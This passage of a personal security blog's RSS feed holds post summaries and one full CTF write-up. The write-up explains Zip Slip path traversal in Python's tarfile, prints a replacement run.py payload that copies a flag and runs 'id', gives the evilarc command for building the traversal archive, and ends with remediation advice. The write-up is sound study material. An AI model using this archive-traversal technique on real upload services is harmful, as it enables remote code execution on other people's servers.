&lt;p&gt;A zip file was provided which contained the full AppData from a windows user.
Based on the description, I felt like all I needed to do was search for and extract the browser's saved passwords.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://blog.haicen.me/posts/dumping-chrome-passwords-using-pypykatz/"&gt;Read more…&lt;/a&gt; (2 min remaining to read)&lt;/p&gt;&lt;/div&gt;</description><guid>https://blog.haicen.me/posts/dumping-chrome-passwords-using-pypykatz/</guid><pubDate>Mon, 30 May 2022 13:27:07 GMT</pubDate></item><item><title>XSS and SSTI in Flask</title><link>https://blog.haicen.me/posts/xss-ssti-in-flask/</link><dc:creator>Haicen</dc:creator><description>&lt;section id="introduction"&gt;
&lt;h2&gt;Introduction&lt;/h2&gt;
&lt;p&gt;According to the project's home page,&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Flask is a lightweight WSGI web application framework. It is designed to make getting started quick and easy, with the ability to scale up to complex applications. It began as a simple wrapper around Werkzeug and Jinja and has become one of the most popular Python web application frameworks.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Django sits at the other end of the python web service spectrum.
Each has their own advantages and disadvantages.
If I had to pick a downside for Flask, it is that can be easy to introduce unintentional vulnerabilities.
This is &lt;strong&gt;not&lt;/strong&gt; a problem with Flask itself, but is a result of improper sanitizing of user input.&lt;/p&gt;
&lt;p&gt;This blog post will explore two vulnerabilities in an intentionally vulnerable flask app.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://blog.haicen.me/posts/xss-ssti-in-flask/"&gt;Read more…&lt;/a&gt; (5 min remaining to read)&lt;/p&gt;&lt;/section&gt;</description><guid>https://blog.haicen.me/posts/xss-ssti-in-flask/</guid><pubDate>Wed, 16 Feb 2022 02:40:41 GMT</pubDate></item><item><title>Confusing script kiddies with random default server pages</title><link>https://blog.haicen.me/posts/confusing-script-kiddies-with-random-default-server-pages/</link><dc:creator>Haicen</dc:creator><description>&lt;p&gt;Anyone who runs a server connected to the internet can tell you that they get hammered all day every day by bots.
Sometimes, a human is poking at things looking for vulnerable applications.
Quite a while ago, I created a simple php script to randomly pretend to be one of the 3 web servers (Apache, Nginx, IIS).&lt;/p&gt;
&lt;p&gt;Due to copyright, I am not sharing the source code from the html page for IIS.
They are pretty easy to find without downloading/installing the package.
The NGINX source is available on &lt;a class="reference external" href="https://github.com/nginx/nginx/blob/master/docs/html/index.html"&gt;Github&lt;/a&gt;
I tried to find the one served by Apache2, but could not find the page I wanted.
Fortunately, it happened to be available on one of my other servers so I just copied it over from there.&lt;/p&gt;
&lt;p&gt;The php script is included below:&lt;/p&gt;
&lt;script src="https://gist.github.com/49e8cca8f0a81c68c8f62e33a8d29d33.js"&gt;&lt;/script&gt;&lt;noscript&gt;&lt;pre class="literal-block"&gt;&amp;lt;?php
// I'm not providing the iis_index.html file, but savvy users can figure out how to get a copy.
// the other two are just the default pages you can find in either projects public code.
// use case: confusing skids

$i = rand(0, 2);
switch ($i)
{
case 0:
        //echo "nginx";
        include "nginx.html";
        break;
case 1:
        //echo "apache";
        include "apache_index.html";
        break;
case 2:
        //echo "IIS";
        include "iis_index.html";
        break;
}
?&amp;gt;&lt;/pre&gt;
&lt;/noscript&gt;</description><guid>https://blog.haicen.me/posts/confusing-script-kiddies-with-random-default-server-pages/</guid><pubDate>Sat, 08 Jan 2022 22:58:02 GMT</pubDate></item><item><title>Zip Slip (malicious archives)</title><link>https://blog.haicen.me/posts/zip-slip-malicious-archives/</link><dc:creator>Haicen</dc:creator><description>&lt;p&gt;Recently, I completed a CTF challenge that involved an interesting vulnerability.
Since the challenge is active, I won't be providing screenshots, but I've kept things general enough that it shouldn't spoil anything.&lt;/p&gt;
&lt;section id="the-web-app"&gt;
&lt;h2&gt;The web app&lt;/h2&gt;
&lt;p&gt;The entire app was provided with a dockerfile, so it could be run offline.&lt;/p&gt;
&lt;p&gt;My first step was to investigate the app and see what vulnerabilities might exist.
The web app is very simple, and was developed using Flask.
It contains a single web page that allows you to upload a tar.gz file.
The uploaded file is extracted using the &lt;a class="reference external" href="https://docs.python.org/3/library/tarfile.html"&gt;tarfile&lt;/a&gt; library.
The validation of user uploaded file is insufficient.&lt;/p&gt;
&lt;p&gt;First, the file is checked to see if it is indeed a tarfile, with a call to &lt;code class="docutils literal"&gt;tarfile.is_tarfile()&lt;/code&gt;.
If this is true, then &lt;cite&gt;tarfile.extract_all()&lt;/cite&gt; is called. There is a warning about this function in the docs.&lt;/p&gt;
&lt;p&gt;Warning&lt;/p&gt;
&lt;p&gt;&lt;code class="docutils literal"&gt;Never extract archives from untrusted sources without prior inspection. It is possible that files are created outside of path, e.g. members that have absolute filenames starting with "/" or filenames with two dots &lt;span class="pre"&gt;"..".&lt;/span&gt;&lt;/code&gt;&lt;/p&gt;
&lt;/section&gt;
&lt;section id="the-vulnerability"&gt;
&lt;h2&gt;The vulnerability&lt;/h2&gt;
&lt;p&gt;Some further research reveals that this is quite an old vulnerability.
The tar program was discovered to be vulnerable all the way back in 2001, &lt;a class="reference external" href="https://nvd.nist.gov/vuln/detail/CVE-2001-1267"&gt;CVE-2001-1267&lt;/a&gt;
The core issue is that tar did not validate filenames, so if the archive contained a file named &lt;code class="docutils literal"&gt;&lt;span class="pre"&gt;../../../../etc/passwd&lt;/span&gt;&lt;/code&gt;, when extracted it would overwrite &lt;code class="docutils literal"&gt;/etc/passwd&lt;/code&gt; by traversing the &lt;code class="docutils literal"&gt;../&lt;/code&gt; directives as long the user invoking tar had the appropriate permissions)&lt;/p&gt;
&lt;p&gt;The python tarfile module apparently shares a great deal of similar code, because the same issue was identified in the python module in 2007 (6 years after the original tar vulnerability).
This was discussed on the python-dev email list &lt;a class="reference external" href="https://mail.python.org/pipermail/python-dev/2007-August/074290.html"&gt;https://mail.python.org/pipermail/python-dev/2007-August/074290.html&lt;/a&gt;
It was again discussed in 2014, &lt;a class="reference external" href="https://bugs.python.org/issue21109"&gt;https://bugs.python.org/issue21109&lt;/a&gt;
Now, 20 years later, there still isn't a resolution.&lt;/p&gt;
&lt;p&gt;In the general sense, I see two potential ways of exploiting a vulnerability like this.
In modern linux environments, /etc/passwd no longer contains sensitive information like password hashes, so overwriting that file won't allow access to the machine.
One potential attack would be to overwrite the users &lt;code class="docutils literal"&gt;&lt;span class="pre"&gt;~/.ssh/authorized_keys&lt;/span&gt;&lt;/code&gt; file to include your own key.
Of course, for that to be exploitable, you would already need access to the file system.&lt;/p&gt;
&lt;p&gt;Since python is now popular for developing web apps through Django and Flask, this opens up a new avenue: uploading a malicious archive to overwrite or create files.&lt;/p&gt;
&lt;p&gt;Back to the challenge, since the app is flask, it is possible to overwrite the main app handler.&lt;/p&gt;
&lt;p&gt;The original file is quite simple&lt;/p&gt;
&lt;div class="code"&gt;&lt;table class="codetable"&gt;&lt;tr&gt;&lt;td class="linenos linenodiv"&gt;&lt;a href="https://blog.haicen.me/posts/zip-slip-malicious-archives/#rest_code_5d05550b16f44aa6ad1684f92562ff5c-1"&gt;&lt;code data-line-number="1"&gt;&lt;/code&gt;&lt;/a&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;code&gt;&lt;a id="rest_code_5d05550b16f44aa6ad1684f92562ff5c-1" name="rest_code_5d05550b16f44aa6ad1684f92562ff5c-1"&gt;&lt;/a&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;application.main&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;app&lt;/span&gt;
&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class="linenos linenodiv"&gt;&lt;a href="https://blog.haicen.me/posts/zip-slip-malicious-archives/#rest_code_5d05550b16f44aa6ad1684f92562ff5c-2"&gt;&lt;code data-line-number="2"&gt;&lt;/code&gt;&lt;/a&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;code&gt;&lt;a id="rest_code_5d05550b16f44aa6ad1684f92562ff5c-2" name="rest_code_5d05550b16f44aa6ad1684f92562ff5c-2"&gt;&lt;/a&gt;&lt;span class="n"&gt;app&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;run&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;host&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'0.0.0.0'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;port&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1337&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;debug&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kc"&gt;True&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;use_evalex&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kc"&gt;False&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;p&gt;and the modified code:&lt;/p&gt;
&lt;div class="code"&gt;&lt;table class="codetable"&gt;&lt;tr&gt;&lt;td class="linenos linenodiv"&gt;&lt;a href="https://blog.haicen.me/posts/zip-slip-malicious-archives/#rest_code_830da48576d146a596598d2c7ea8ff80-1"&gt;&lt;code data-line-number=" 1"&gt;&lt;/code&gt;&lt;/a&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;code&gt;&lt;a id="rest_code_830da48576d146a596598d2c7ea8ff80-1" name="rest_code_830da48576d146a596598d2c7ea8ff80-1"&gt;&lt;/a&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;application.main&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;app&lt;/span&gt;
&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class="linenos linenodiv"&gt;&lt;a href="https://blog.haicen.me/posts/zip-slip-malicious-archives/#rest_code_830da48576d146a596598d2c7ea8ff80-2"&gt;&lt;code data-line-number=" 2"&gt;&lt;/code&gt;&lt;/a&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;code&gt;&lt;a id="rest_code_830da48576d146a596598d2c7ea8ff80-2" name="rest_code_830da48576d146a596598d2c7ea8ff80-2"&gt;&lt;/a&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;shutil&lt;/span&gt;
&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class="linenos linenodiv"&gt;&lt;a href="https://blog.haicen.me/posts/zip-slip-malicious-archives/#rest_code_830da48576d146a596598d2c7ea8ff80-3"&gt;&lt;code data-line-number=" 3"&gt;&lt;/code&gt;&lt;/a&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;code&gt;&lt;a id="rest_code_830da48576d146a596598d2c7ea8ff80-3" name="rest_code_830da48576d146a596598d2c7ea8ff80-3"&gt;&lt;/a&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;os&lt;/span&gt;
&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class="linenos linenodiv"&gt;&lt;a href="https://blog.haicen.me/posts/zip-slip-malicious-archives/#rest_code_830da48576d146a596598d2c7ea8ff80-4"&gt;&lt;code data-line-number=" 4"&gt;&lt;/code&gt;&lt;/a&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;code&gt;&lt;a id="rest_code_830da48576d146a596598d2c7ea8ff80-4" name="rest_code_830da48576d146a596598d2c7ea8ff80-4"&gt;&lt;/a&gt;&lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class="linenos linenodiv"&gt;&lt;a href="https://blog.haicen.me/posts/zip-slip-malicious-archives/#rest_code_830da48576d146a596598d2c7ea8ff80-5"&gt;&lt;code data-line-number=" 5"&gt;&lt;/code&gt;&lt;/a&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;code&gt;&lt;a id="rest_code_830da48576d146a596598d2c7ea8ff80-5" name="rest_code_830da48576d146a596598d2c7ea8ff80-5"&gt;&lt;/a&gt;    &lt;span class="n"&gt;path&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;'/app/application/static/'&lt;/span&gt;
&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class="linenos linenodiv"&gt;&lt;a href="https://blog.haicen.me/posts/zip-slip-malicious-archives/#rest_code_830da48576d146a596598d2c7ea8ff80-6"&gt;&lt;code data-line-number=" 6"&gt;&lt;/code&gt;&lt;/a&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;code&gt;&lt;a id="rest_code_830da48576d146a596598d2c7ea8ff80-6" name="rest_code_830da48576d146a596598d2c7ea8ff80-6"&gt;&lt;/a&gt;    &lt;span class="n"&gt;shutil&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;copy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'flag'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'flag'&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class="linenos linenodiv"&gt;&lt;a href="https://blog.haicen.me/posts/zip-slip-malicious-archives/#rest_code_830da48576d146a596598d2c7ea8ff80-7"&gt;&lt;code data-line-number=" 7"&gt;&lt;/code&gt;&lt;/a&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;code&gt;&lt;a id="rest_code_830da48576d146a596598d2c7ea8ff80-7" name="rest_code_830da48576d146a596598d2c7ea8ff80-7"&gt;&lt;/a&gt;
&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class="linenos linenodiv"&gt;&lt;a href="https://blog.haicen.me/posts/zip-slip-malicious-archives/#rest_code_830da48576d146a596598d2c7ea8ff80-8"&gt;&lt;code data-line-number=" 8"&gt;&lt;/code&gt;&lt;/a&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;code&gt;&lt;a id="rest_code_830da48576d146a596598d2c7ea8ff80-8" name="rest_code_830da48576d146a596598d2c7ea8ff80-8"&gt;&lt;/a&gt;    &lt;span class="n"&gt;out&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;subprocess&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;check_output&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'id'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class="linenos linenodiv"&gt;&lt;a href="https://blog.haicen.me/posts/zip-slip-malicious-archives/#rest_code_830da48576d146a596598d2c7ea8ff80-9"&gt;&lt;code data-line-number=" 9"&gt;&lt;/code&gt;&lt;/a&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;code&gt;&lt;a id="rest_code_830da48576d146a596598d2c7ea8ff80-9" name="rest_code_830da48576d146a596598d2c7ea8ff80-9"&gt;&lt;/a&gt;
&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class="linenos linenodiv"&gt;&lt;a href="https://blog.haicen.me/posts/zip-slip-malicious-archives/#rest_code_830da48576d146a596598d2c7ea8ff80-10"&gt;&lt;code data-line-number="10"&gt;&lt;/code&gt;&lt;/a&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;code&gt;&lt;a id="rest_code_830da48576d146a596598d2c7ea8ff80-10" name="rest_code_830da48576d146a596598d2c7ea8ff80-10"&gt;&lt;/a&gt;    &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'logfile.txt'&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="s1"&gt;'w'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class="linenos linenodiv"&gt;&lt;a href="https://blog.haicen.me/posts/zip-slip-malicious-archives/#rest_code_830da48576d146a596598d2c7ea8ff80-11"&gt;&lt;code data-line-number="11"&gt;&lt;/code&gt;&lt;/a&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;code&gt;&lt;a id="rest_code_830da48576d146a596598d2c7ea8ff80-11" name="rest_code_830da48576d146a596598d2c7ea8ff80-11"&gt;&lt;/a&gt;        &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class="linenos linenodiv"&gt;&lt;a href="https://blog.haicen.me/posts/zip-slip-malicious-archives/#rest_code_830da48576d146a596598d2c7ea8ff80-12"&gt;&lt;code data-line-number="12"&gt;&lt;/code&gt;&lt;/a&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;code&gt;&lt;a id="rest_code_830da48576d146a596598d2c7ea8ff80-12" name="rest_code_830da48576d146a596598d2c7ea8ff80-12"&gt;&lt;/a&gt;&lt;span class="k"&gt;except&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class="linenos linenodiv"&gt;&lt;a href="https://blog.haicen.me/posts/zip-slip-malicious-archives/#rest_code_830da48576d146a596598d2c7ea8ff80-13"&gt;&lt;code data-line-number="13"&gt;&lt;/code&gt;&lt;/a&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;code&gt;&lt;a id="rest_code_830da48576d146a596598d2c7ea8ff80-13" name="rest_code_830da48576d146a596598d2c7ea8ff80-13"&gt;&lt;/a&gt;    &lt;span class="k"&gt;pass&lt;/span&gt;
&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class="linenos linenodiv"&gt;&lt;a href="https://blog.haicen.me/posts/zip-slip-malicious-archives/#rest_code_830da48576d146a596598d2c7ea8ff80-14"&gt;&lt;code data-line-number="14"&gt;&lt;/code&gt;&lt;/a&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;code&gt;&lt;a id="rest_code_830da48576d146a596598d2c7ea8ff80-14" name="rest_code_830da48576d146a596598d2c7ea8ff80-14"&gt;&lt;/a&gt;
&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class="linenos linenodiv"&gt;&lt;a href="https://blog.haicen.me/posts/zip-slip-malicious-archives/#rest_code_830da48576d146a596598d2c7ea8ff80-15"&gt;&lt;code data-line-number="15"&gt;&lt;/code&gt;&lt;/a&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;code&gt;&lt;a id="rest_code_830da48576d146a596598d2c7ea8ff80-15" name="rest_code_830da48576d146a596598d2c7ea8ff80-15"&gt;&lt;/a&gt;&lt;span class="n"&gt;app&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;run&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;host&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'0.0.0.0'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;port&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1337&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;debug&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kc"&gt;True&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;use_evalex&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kc"&gt;False&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;p&gt;This simply copies the flag from it's location within the app folder to the static files that are served by flask.
This could be modified to do the same thing for multiple files, or initiate a reverse shell.&lt;/p&gt;
&lt;/section&gt;
&lt;section id="the-exploit"&gt;
&lt;h2&gt;The exploit&lt;/h2&gt;
&lt;p&gt;I found a tool that had already been created to craft the malicious archive.&lt;/p&gt;
&lt;p&gt;&lt;a class="reference external" href="https://github.com/ptoomey3/evilarc"&gt;https://github.com/ptoomey3/evilarc&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;That script uses the same vulnerable library to craft the archive.
This also appears to work on zip archives as well, but that's something for another time.&lt;/p&gt;
&lt;p&gt;Simply running the script &lt;code class="docutils literal"&gt;python evilarc.py run.py &lt;span class="pre"&gt;-f&lt;/span&gt; evil.tar.gz &lt;span class="pre"&gt;-o&lt;/span&gt; unix &lt;span class="pre"&gt;-p&lt;/span&gt; /app&lt;/code&gt; generates the archive.&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;&lt;p&gt;&lt;code class="docutils literal"&gt;evil.tar.gz&lt;/code&gt; is the file that is created&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code class="docutils literal"&gt;run.py&lt;/code&gt; is the modified file from earlier&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code class="docutils literal"&gt;&lt;span class="pre"&gt;-p&lt;/span&gt; /app&lt;/code&gt; specifies the directory where &lt;code class="docutils literal"&gt;run.py&lt;/code&gt; will be overwritten after traversal&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Uploading the resulting file in a browser and then doing &lt;code class="docutils literal"&gt;curl &lt;span class="pre"&gt;http://localhost:1337/static/flag&lt;/span&gt;&lt;/code&gt; outputs the flag.&lt;/p&gt;
&lt;p&gt;Further, &lt;code class="docutils literal"&gt;curl &lt;span class="pre"&gt;http://localhost:1337/static/logfile.txt&lt;/span&gt;&lt;/code&gt; reveals this app is running as root
&lt;code class="docutils literal"&gt;'uid=0(root) gid=0(root) &lt;span class="pre"&gt;groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)&lt;/span&gt;&lt;/code&gt;&lt;/p&gt;
&lt;/section&gt;
&lt;section id="impact"&gt;
&lt;h2&gt;Impact&lt;/h2&gt;
&lt;p&gt;This is a pretty severe vulnerability as it allows full remote code execution.
In this particular instance, the flask app is run as root, and directly runs the app.py file in debug mode.&lt;/p&gt;
&lt;/section&gt;
&lt;section id="remediation"&gt;
&lt;h2&gt;Remediation&lt;/h2&gt;
&lt;p&gt;The most severe problem with this app is that the contents of the uploaded file are trusted implicitly.
To fix this, the user-supplied archive should not be blindly extracted.
There currently isn't a fixed version of the &lt;code class="docutils literal"&gt;tarfile&lt;/code&gt; module, so until that is fixed upstream, some crude checks might provide some protection.
Ex: refusing to extract files that start with &lt;code class="docutils literal"&gt;..&lt;/code&gt;
The flask app shouldn't be run with debug mode turned on in a production environment.
The flask app also shouldn't be running as root.&lt;/p&gt;
&lt;p&gt;I'm not sure how applicable this is to real world websites, as this example relies on &lt;code class="docutils literal"&gt;supervisord&lt;/code&gt; detecting the overwritten &lt;code class="docutils literal"&gt;/app/run.py&lt;/code&gt; file and reloading.
Having never deployed a flask app to production myself, my understanding is that something like gnuicorn would only do that if debug settings were explicitly enabled.
&lt;a class="reference external" href="https://docs.gunicorn.org/en/stable/settings.html#debugging"&gt;https://docs.gunicorn.org/en/stable/settings.html#debugging&lt;/a&gt;&lt;/p&gt;
&lt;/section&gt;
&lt;section id="closing"&gt;
&lt;h2&gt;Closing&lt;/h2&gt;
&lt;p&gt;This was a really fun challenge (and writing this took much longer than getting the flag).
It is really interesting that this bug still exists 20 years after first identified in tar.
The spread of python based web apps due to the popularity of Django and flask has brought old vulnerabilities that previously required local file system access can now be leveraged to remotely execute code.&lt;/p&gt;
&lt;/section&gt;</description><category>ctf</category><category>evilarc</category><category>flask</category><category>hacking</category><category>python</category><category>zipslip</category><guid>https://blog.haicen.me/posts/zip-slip-malicious-archives/</guid><pubDate>Sat, 04 Dec 2021 22:41:43 GMT</pubDate></item><item><title>Reverse Engineering a $20 remote controlled outlet</title><link>https://blog.haicen.me/posts/reverse-engineering-a-20-remote-controlled-outlet/</link><dc:creator>Haicen</dc:creator><description>&lt;section id="introduction"&gt;
&lt;h2&gt;Introduction&lt;/h2&gt;
&lt;p&gt;A few years ago, I bought a remote controlled outlet from Walmart.
I don't recall the exact price, but it was less than $20.
It was pretty much purchased for the explicit reason of trying to understand how they worked.
The end goal, is that I wanted to know if&lt;/p&gt;
&lt;ol class="arabic simple"&gt;
&lt;li&gt;&lt;p&gt;I could decode/intercept the signals&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;It was vulnerable to replay attacks&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;section id="tools-used"&gt;
&lt;h3&gt;Tools Used&lt;/h3&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;&lt;p&gt;RTL SDR&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Yardstick One&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Inspectrum&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;GQRX&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;rfcat&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;This is going to be quite a long post, so I suggest getting a cup of coffee before continuing.
At the end, I have included a youtube video showing the entire process.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://blog.haicen.me/posts/reverse-engineering-a-20-remote-controlled-outlet/"&gt;Read more…&lt;/a&gt; (12 min remaining to read)&lt;/p&gt;&lt;/section&gt;&lt;/section&gt;</description><category>hacking</category><category>radio</category><category>SDR</category><guid>https://blog.haicen.me/posts/reverse-engineering-a-20-remote-controlled-outlet/</guid><pubDate>Sat, 14 Aug 2021 23:47:14 GMT</pubDate></item></channel></rss>